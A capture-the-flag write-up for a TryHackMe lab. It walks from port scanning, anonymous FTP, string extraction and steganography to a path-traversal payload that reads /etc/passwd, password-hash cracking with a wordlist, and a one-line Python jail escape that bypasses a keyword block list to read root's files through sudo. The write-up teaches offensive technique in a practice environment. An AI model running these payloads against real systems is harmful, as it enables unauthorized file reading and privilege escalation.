# Tokyo Ghoul

[Play](https://tryhackme.com/room/tokyoghoul666)

## 1. Scanning & Enumeration
### 1.1 Port Scanning
```
❯ nmap -sC -sV -A 10.10.202.61
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 01:48 EDT
Nmap scan report for 10.10.202.61
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.150.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Tokyo goul
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.17 seconds
```
### 1.2 FTP
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
226 Directory send OK.
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23 22:26 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23 22:26 Talk_with_me
226 Directory send OK.
ftp> get Aogiri_tree.txt
...
ftp> cd Talk_with_me
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23 22:26 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23 22:26 rize_and_kaneki.jpg
226 Directory send OK.
ftp> get need_to_talk
...
ftp> get rize_and_kaneki.jpg
...
```

### 1.3 File Exploration
```
❯ file need_to_talk
need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped
```

```
❯ ./need_to_talk
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> no
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
```

```
❯ strings need_to_talk
...
u/UH
You_founH
d_1t
[]A\A]A^A_
{username}
...
```

```
❯ ./need_to_talk
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> {username}
Good job. I believe this is what you came for:
{stego pass}
```

```
❯ steghide --extract --stegofile rize_and_kaneki.jpg
Enter passphrase: 
wrote extracted data to "yougotme.txt".
```

```
❯ cat yougotme.txt
haha you are so smart kaneki but can you talk my code 

..... .-
....- ....-
....- -....
--... ----.
{truncated}
...

if you can talk it allright you got my secret directory 
```

Using: [CyberChef](http://icyberchef.com/)

![](https://i.imgur.com/zVhiiBo.png)
We have the secret directory!

### 1.4 Web Exploration
![](https://i.imgur.com/qPK7Yzn.png)
It tells us to scan, so let's do that.

![](https://i.imgur.com/TOFQmZX.png)
We reach at an intersting page, which looks vulnerable to LFI.

`index.php?view=../../../../etc/passwd`

![](https://i.imgur.com/d5MDFgW.png)
Intersting! But what about a specially crafted request? Trying the below: `index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`

We get the good stuff!
`{username}:{some tasty info mmmmm} `

### 1.5 Hash Cracking
```
❯ john --wordlist="/usr/share/wordlists/rockyou.txt" hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{password mmmmm}      ({username})
1g 0:00:00:01 DONE (2021-03-17 02:43) 0.7812g/s 1200p/s 1200c/s 1200C/s kucing..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## 2. Foothild

```
{username}@vagrant:~$ sudo -l
[sudo] password for {username}: 
Matching Defaults entries for {username} on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User {username} may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/{username}/jail.py
{username}@vagrant:~$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Jan 23 22:33 .
drwxr-xr-x 4 root root 4096 Jan 23 22:27 ..
-rw-r--r-- 1 root root  588 Jan 23 22:27 jail.py
-rw-r--r-- 1 root root   33 Jan 23 22:27 user.txt
```

```
{username}@vagrant:~$ cat jail.py 
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

```
What ? You gonna stand like a chicken ? fight me Kaneki
>>> hi
Traceback (most recent call last):
  File "jail.py", line 16, in <module>
    main()
  File "jail.py", line 13, in main
    exec(text)
  File "<string>", line 1, in <module>
NameError: name 'hi' is not defined
```

```
>>> "cat root/root.txt"
No Kaneki you are so dead
```

```
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
```
And we are done!
